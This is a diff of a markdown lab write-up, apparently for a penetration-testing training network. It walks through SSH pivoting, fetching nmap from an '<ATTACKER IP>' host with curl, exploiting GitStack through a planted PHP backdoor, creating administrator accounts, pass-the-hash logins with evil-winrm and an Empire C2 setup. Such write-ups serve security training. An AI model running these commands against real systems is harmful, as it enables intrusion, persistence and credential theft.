@@ -78,20 +78,20 @@ before from 80/443 port scan.
   ssh -i id_rsa root@10.200.159.200
   ```
   
- ## Pivoting
- 
-  Right now we are inside of first machine but we need to keep going and keep enumerating so we can start pivoting. Pivoting is the art of using access obtained over one machine
-  to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing. There are two main methods of pivoting :
-  - Tunnelling/Proxying - Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially
-  also be tunnelled inside another protocol (e.g. SSH tunnelling) which can be useful for evading a basic IDS or firewall.
-  - Port Forwarding - Creating a connection between a local port and a single port on a target via compromised host.
-  
-  Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed.
-  
+## Pivoting
+
+Right now we are inside of first machine but we need to keep going and keep enumerating so we can start pivoting. Pivoting is the art of using access obtained over one machine
+to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing. There are two main methods of pivoting :
+- Tunnelling/Proxying - Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially
+also be tunnelled inside another protocol (e.g. SSH tunnelling) which can be useful for evading a basic IDS or firewall.
+- Port Forwarding - Creating a connection between a local port and a single port on a target via compromised host.
+
+Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed.
+
   ---
-  
-  ## Theory behind pivoting
-  
+
+  ### Theory behind pivoting
+
   You can skip that part if you want to see only practical solutions for this room.
   Things that I'll focus on :
   - Proxy tools
@@ -280,85 +280,85 @@ before from 80/443 port scan.
   ```
   
   ---
-  
-  ## Enumerating before pivoting
-  
-  Information is power - our first step when attempting to pivot through a network is to get an idea of what's around us. Ideally we want to take advantage of pre-installed
-  tools on the system to enumerate a network through a compromised host. This is called Living off the Land (LotL) - a good way to minimise risk.
-  ```
-  ifconfig
-  arp -a
-  cat /etc/hosts
-  cat /etc/resolv.conf
-  ```
-  Next up we will download a static nmap binary on our attacker machine and download it using python server and `curl` to our target machine. 
-  ```
-  sudo python3 -m http.server 80
-  curl <ATTACKER IP>/nmap -o /tmp/nmap && chmod +x /tmp/nmap
-  ```
-  With that binary we can scan the network from target machine. We should get some interesting hosts and services.
-  ```
-  ./nmap -sn 10.200.159.1-255 -oN scan.txt
-  ```
-  If you don't already know `-sn` switch is used to tell nmap not to scan any port and instead just determine which hosts are alive. We can do the same with `fping`.
-  After that we can focus only on those hosts that are alive instead of scanning the whole network and all ports. It would be waste of our time.
-  ```
-  Nmap scan report for ip-10-200-159-1.eu-west-1.compute.internal (10.200.159.1)
-  Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
-  Host is up (-0.18s latency).
-  MAC Address: 02:98:7F:EB:16:FB (Unknown)
-  Nmap scan report for ip-10-200-159-100.eu-west-1.compute.internal (10.200.159.100)
-  Host is up (0.00016s latency).
-  MAC Address: 02:81:EA:BC:A8:2F (Unknown)
-  Nmap scan report for ip-10-200-159-150.eu-west-1.compute.internal (10.200.159.150)
-  Host is up (0.00012s latency).
-  MAC Address: 02:DC:AC:DE:3C:C3 (Unknown)
-  Nmap scan report for ip-10-200-159-250.eu-west-1.compute.internal (10.200.159.250)
-  Host is up (0.00017s latency).
-  MAC Address: 02:B9:77:CE:A4:C7 (Unknown)
-  Nmap scan report for ip-10-200-159-200.eu-west-1.compute.internal (10.200.159.200)
-  Host is up.
-  ```
-  If we exclude our host and those hosts that are not in-scope we get two alive hosts - 10.200.159.100 and 10.200.159.150.
-  ```
-  nmap -p- 10.200.159.100,150
-  
-  10.200.159.150
-  PORT  STATE   SERVICE
-  80    open    http 
-  3389  open    ms-wbt-server
-  5985  open    wsman
-  
-  10.200.159.100
-  We can assume that this host is not accessible from our current position in the network because all of the ports are filtered.
-  ```
-  Without proxy we cannot perform a service detection scan on the target so we will assume that those identified services are accurate. It seems that the most vulnerable service 
-  is the http on port 80.
-  
-  ## Pivoting
-  
-  Right now we have to get access to the 10.200.159.150:80 machine using our root access on 10.200.159.200 machine. We can do that by simply creating an SSH connection between 
-  our 10.50.156.24:8000 -> 10.200.159.200 -> 10.200.159.150:80.
-  ```
-  ssh -i id_rsa -L 8000:10.200.159.150:80 root@10.200.159.200 -fN
-  ```
-  When we visit our http://127.0.0.1/8000 web page we can see that default webpage was not found so we should try 3 other URLs. One of them is /gitstack which is working.
-  As default credentials (admin:admin) doesn't work on this site we should look for any vulnerability in databases like https://www.exploit-db.com/ or searchsploit.
-  What I found out is that there is a vulnerability in exploit-db without given CVE named "GitStack 2.3.10 - RCE". Let's try to use it.
-  
-  First of all we need to download it onto our attacker machine. We can copy it or git clone the entire directory, I prefer the first solution. Next up we should look through 
-  the code to understand how it works and edit parameters like "ip" or "command". For my configuration it shoud look like this :
-  ```
-  ip = '127.0.0.1:8000'
-  command = 'whoami'
-  ```
-  The command stays as it is because we want to know if this vulnerability even works. After those changes we can run this exploit with `python2 ./<NAME>` and get the output 
-  `nt authority\system` which is really good for us because we don't have to escalate our privileges on this machine. From here we want to obtain a full reverse shell. 
-  Another excelent fact is that this first run of the exploit creates a backdoor for us which we can use later for creating a reverse shell. Backdoor by default is in 
-  http://127.0.0.1:8000/web/exploit.php and it uses "a=" parameter for commands. For example right now you can accomplish the same output with :
-  ```
-  curl -X POST http://127.0.0.1:8000/web/exploit.php -d "a=whoami"
-  ```
+
+## Enumerating before pivoting
+
+Information is power - our first step when attempting to pivot through a network is to get an idea of what's around us. Ideally we want to take advantage of pre-installed
+tools on the system to enumerate a network through a compromised host. This is called Living off the Land (LotL) - a good way to minimise risk.
+```
+ifconfig
+arp -a
+cat /etc/hosts
+cat /etc/resolv.conf
+```
+Next up we will download a static nmap binary on our attacker machine and download it using python server and `curl` to our target machine. 
+```
+sudo python3 -m http.server 80
+curl <ATTACKER IP>/nmap -o /tmp/nmap && chmod +x /tmp/nmap
+```
+With that binary we can scan the network from target machine. We should get some interesting hosts and services.
+```
+./nmap -sn 10.200.159.1-255 -oN scan.txt
+```
+If you don't already know `-sn` switch is used to tell nmap not to scan any port and instead just determine which hosts are alive. We can do the same with `fping`.
+After that we can focus only on those hosts that are alive instead of scanning the whole network and all ports. It would be waste of our time.
+```
+Nmap scan report for ip-10-200-159-1.eu-west-1.compute.internal (10.200.159.1)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (-0.18s latency).
+MAC Address: 02:98:7F:EB:16:FB (Unknown)
+Nmap scan report for ip-10-200-159-100.eu-west-1.compute.internal (10.200.159.100)
+Host is up (0.00016s latency).
+MAC Address: 02:81:EA:BC:A8:2F (Unknown)
+Nmap scan report for ip-10-200-159-150.eu-west-1.compute.internal (10.200.159.150)
+Host is up (0.00012s latency).
+MAC Address: 02:DC:AC:DE:3C:C3 (Unknown)
+Nmap scan report for ip-10-200-159-250.eu-west-1.compute.internal (10.200.159.250)
+Host is up (0.00017s latency).
+MAC Address: 02:B9:77:CE:A4:C7 (Unknown)
+Nmap scan report for ip-10-200-159-200.eu-west-1.compute.internal (10.200.159.200)
+Host is up.
+```
+If we exclude our host and those hosts that are not in-scope we get two alive hosts - 10.200.159.100 and 10.200.159.150.
+```
+nmap -p- 10.200.159.100,150
+
+10.200.159.150
+PORT  STATE   SERVICE
+80    open    http 
+3389  open    ms-wbt-server
+5985  open    wsman
+
+10.200.159.100
+We can assume that this host is not accessible from our current position in the network because all of the ports are filtered.
+```
+Without proxy we cannot perform a service detection scan on the target so we will assume that those identified services are accurate. It seems that the most vulnerable service 
+is the http on port 80.
+
+## Pivoting continued
+
+Right now we have to get access to the 10.200.159.150:80 machine using our root access on 10.200.159.200 machine. We can do that by simply creating an SSH connection between 
+our 10.50.156.24:8000 -> 10.200.159.200 -> 10.200.159.150:80.
+```
+ssh -i id_rsa -L 8000:10.200.159.150:80 root@10.200.159.200 -fN
+```
+When we visit our http://127.0.0.1/8000 web page we can see that default webpage was not found so we should try 3 other URLs. One of them is /gitstack which is working.
+As default credentials (admin:admin) doesn't work on this site we should look for any vulnerability in databases like https://www.exploit-db.com/ or searchsploit.
+What I found out is that there is a vulnerability in exploit-db without given CVE named "GitStack 2.3.10 - RCE". Let's try to use it.
+
+First of all we need to download it onto our attacker machine. We can copy it or git clone the entire directory, I prefer the first solution. Next up we should look through 
+the code to understand how it works and edit parameters like "ip" or "command". For my configuration it shoud look like this :
+```
+ip = '127.0.0.1:8000'
+command = 'whoami'
+```
+The command stays as it is because we want to know if this vulnerability even works. After those changes we can run this exploit with `python2 ./<NAME>` and get the output 
+`nt authority\system` which is really good for us because we don't have to escalate our privileges on this machine. From here we want to obtain a full reverse shell. 
+Another excelent fact is that this first run of the exploit creates a backdoor for us which we can use later for creating a reverse shell. Backdoor by default is in 
+http://127.0.0.1:8000/web/exploit.php and it uses "a=" parameter for commands. For example right now you can accomplish the same output with :
+```
+curl -X POST http://127.0.0.1:8000/web/exploit.php -d "a=whoami"
+```
   
   ### Windows Reverse Shell
   
@@ -388,28 +388,28 @@ before from 80/443 port scan.
   
   And just like this we got our powershell reverse shell. Easy, right?
   
-  ## Post-exploitation of Windows Machine
-  
-  From the enumeration we know that ports 3389 and 5985 are open. This means that we should be able to obtain either a GUI through RDP (3389) or a stable CLI shell using WINRM 
-  (5985). Specifically we need a user account with the "Remote Desktop Users" group for RDP or the "Remote Management Users" group for WinRM. We already have the ultimate 
-  access so we can easily create such an accounts. 
-  ```
-  net user <USERNAME> <PASSWORD> /add
-  net localgroup Administrators <USERNAME> /add
-  net localgroup "Remote Management Users" <USERNAME> /add
-  ```
-  With that out of our way we can access this machine with evil-winrm or xfree-rdp.
-  ```
-  sudo gem install evil-winrm
-  ssh -i id_rsa -L 8001:10.200.86.150:5985 root@10.200.159.200 -fN
-  evil-winrm -u <USERNAME> -p <PASSWORD> -i 127.0.0.1 -P 8001
-  ```
-  If it comes to xfreerdp we are able to create a shared drive between the attacking machine and the target. We can do this with switch `/drive:`. A useful directory to share is 
-  the /usr/share/windows-resources directory on Kali. This shares most of the Windows tools including Mimikatz.
-  ```
-  ssh -i id_rsa -L 8002:10.200.86.150:3389 root@10.200.159.200 -fN
-  xfreerdp /v:127.0.0.1:8002 /u:<USERNAME> /p:<PASSWORD> /drive:/usr/share/windows-resources,share
-  ```
+## Post-exploitation of Windows Machine
+
+From the enumeration we know that ports 3389 and 5985 are open. This means that we should be able to obtain either a GUI through RDP (3389) or a stable CLI shell using WINRM 
+(5985). Specifically we need a user account with the "Remote Desktop Users" group for RDP or the "Remote Management Users" group for WinRM. We already have the ultimate 
+access so we can easily create such an accounts. 
+```
+net user <USERNAME> <PASSWORD> /add
+net localgroup Administrators <USERNAME> /add
+net localgroup "Remote Management Users" <USERNAME> /add
+```
+With that out of our way we can access this machine with evil-winrm or xfree-rdp.
+```
+sudo gem install evil-winrm
+ssh -i id_rsa -L 8001:10.200.86.150:5985 root@10.200.159.200 -fN
+evil-winrm -u <USERNAME> -p <PASSWORD> -i 127.0.0.1 -P 8001
+```
+If it comes to xfreerdp we are able to create a shared drive between the attacking machine and the target. We can do this with switch `/drive:`. A useful directory to share is 
+the /usr/share/windows-resources directory on Kali. This shares most of the Windows tools including Mimikatz.
+```
+ssh -i id_rsa -L 8002:10.200.86.150:3389 root@10.200.159.200 -fN
+xfreerdp /v:127.0.0.1:8002 /u:<USERNAME> /p:<PASSWORD> /drive:/usr/share/windows-resources,share
+```
   
   ### Mimikatz
   
@@ -428,10 +428,37 @@ before from 80/443 port scan.
   ```
   evil-winrm -u Administrator -H <hash> -i 127.0.0.1 -P 8001
   ```
-  Just like this we were able to establish a stable shell. But we should keep going deeper into the network.
+  Just like this we were able to establish a stable shell.
   
-  
-  
+## Command and Control (Empire tool)
 
+What after getting the stable shell? With a foothold in a target network, we can start looking to bring what is known as a *C2 (Command and Control) Framework* into play. C2 
+Frameworks are used to consolidate an attacker's position within a network and simplify post-exploitation steps (privesc, AV evasion, pivoting, looting etc.), as well as 
+providing red teams with extensive collaboration features. There are many C2 Frameworks available but the most famous is likely *Cobal Strike*. An excellence resource for 
+finding C2 frameworks is The C2 Matrix. 
+  
+In this room we are introduced to a C2 framework named *Empire*. Powershell Empire is a framework built primarily to attack Windows targets. It provides a wide range of modules 
+to take initial access to a network of devices and turn it into something much bigger. 
+  
+Installation process :
+```
+sudo apt install powershell-empire starkiller
+sudo powershell-empire server
+```
+The second command is used to start an Empire server. This should stay running in the background whenever we want to use either the Empire Client or Starkiller (GUI extension of 
+Empire).
+  
+With the server started you can get the Empire CLI Client working with `poewrshell-empire client`. 
+  
+Powershell Empire has several major sections to it :
+  - Listeners - they listen for a connection and faciliate further exploitation
+  - Stagers - essentially payloads generated by Empire to create a robust reverse shell in conjunction with a listener. 
+  - Agents - are the equivalent of a Metasploit "Session". They are connections to compromised targets, and allow an attacker to further interact with the system.
+  - Modules - used in conjuction with agents to perform further exploitation. For example they can work through an existing agent to dump the password hashes from the server.
+
+  
+  
+  
+  
   
   
